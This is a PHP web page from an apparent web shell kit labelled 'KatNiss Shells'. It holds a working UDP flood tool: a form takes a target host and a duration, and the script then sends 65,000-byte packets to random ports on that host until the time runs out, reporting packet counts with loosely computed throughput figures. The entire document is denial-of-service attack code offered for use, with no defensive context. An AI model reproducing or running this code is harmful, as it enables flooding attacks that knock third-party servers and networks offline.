?>
<html>
<body>
<center>
<font color="#b8b8b8">
<pre>
KatNiss Shells
</pre>
<STYLE>
input{
background-color: ##A4A4A4; font-size: 8pt; color: ##FE2E64; font-family: Tahoma; border: 1 solid #66;
}
button{
background-color: ##A4A4A4; font-size: 8pt; color: ##FE2E64; font-family: Tahoma; border: 1 solid #66;
}
body { 
background-color: ##BDBDBD;
}
</style>
<?php
if(isset($_GET['host'])&&isset($_GET['time'])){
    $packets = 0; $exec_time = $_GET['time']; $max_time = time()+$exec_time; $host = $_GET['host'];
    for($i=0;$i<65000;$i++) $out .= 'X';
    while(time() < $max_time){
        $packets++;
        $rand = rand(1,65000);
        $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
        if($fp){
            fwrite($fp, $out);
            fclose($fp);
        }
    }
echo "<br><b>UDP Flood</b><br>Completed with $packets (" . round(($packets*69)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time*107, 2) . " packets per second \n";    
}else{ 
echo '<br><b>UDP Flood</b><br>
      <form action=? method=GET>
      <input type="hidden" name="act" value="phptools">
      Host: <br><input type=text name=host value=><br>
      Length (seconds): <br><input type=text name=time><br><br>
      <input type=submit value=Go></form>';
}
?>
</center>
</body>
</html>